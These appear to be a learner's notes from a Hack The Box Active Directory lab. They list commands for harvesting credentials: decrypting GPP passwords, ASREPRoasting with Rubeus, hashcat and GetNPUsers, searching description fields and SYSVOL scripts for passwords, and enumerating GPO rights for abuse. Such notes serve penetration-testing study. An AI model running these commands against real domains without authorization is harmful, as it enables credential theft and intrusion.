## Exchange Related Group Membership
#### Viewing Organization Management's Permissions
![](Pasted%20image%2020260530220200.png)
## Printer Bug
#### Enumerating for MS-PRN Printer Bug

```powershell
PS C:\htb> Import-Module .\SecurityAssessment.ps1 
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
## Enumerating DNS Records
#### Using adidnsdump

```shell
3kjS@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
#### Viewing the Contents of the records.csv File

```shell
3kjS@htb[/htb]$ head records.csv
```
![](Screenshot%202026-05-31%20at%2020.43.54.png)
#### Using the -r Option to Resolve Unknown Records

```shell
3kjS@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
#### Finding Hidden Records in the records.csv File

```shell
3kjS@htb[/htb]$ head records.csv
```
![](Screenshot%202026-05-31%20at%2020.44.46.png)
### Password in Description Field
#### Finding Passwords in the Description Field using Get-Domain User

```powershell
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## Credentials in SMB Shares and SYSVOL Scripts
#### Discovering an Interesting Script

```powershell
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
#### Finding a Password in the Script

```powershell
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```
## Group Policy Preferences (GPP) Passwords
#### Viewing Groups.xml
![](Pasted%20image%2020260531204758.png)
#### Decrypting the Password with gpp-decrypt

```shell
3kjS@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE 

Password1
```
#### Locating & Retrieving GPP Passwords with CrackMapExec

```shell
3kjS@htb[/htb]$ crackmapexec smb -L | grep gpp
```
#### Using CrackMapExec's gpp_autologin Module

```shell
3kjS@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
## ASREPRoasting
#### Viewing an Account with the Do not Require Kerberos Preauthentication Option
![](Pasted%20image%2020260531205123.png)
#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

```powershell
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
#### Retrieving AS-REP in Proper Format using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
![](Screenshot%202026-05-31%20at%2020.52.55.png)
#### Cracking the Hash Offline with Hashcat

```shell
3kjS@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
#### Retrieving the AS-REP Using Kerbrute

```shell
3kjS@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
#### Hunting for Users with Kerberos Pre-auth Not Required

```shell
3kjS@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
## Group Policy Object (GPO) Abuse
#### Enumerating GPO Names with PowerView

```powershell
PS C:\htb> Get-DomainGPO |select displayname
```
#### Enumerating GPO Names with a Built-In Cmdlet

```powershell
PS C:\htb> Get-GPO -All | Select DisplayName
```
#### Enumerating Domain User GPO Rights

```powershell
PS C:\htb> $sid=Convert-NameToSid "Domain Users" 
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
#### Converting GPO GUID to Name

```powershell
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.
![](Pasted%20image%2020260531210012.png)
If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.
![](Pasted%20image%2020260531210019.png)
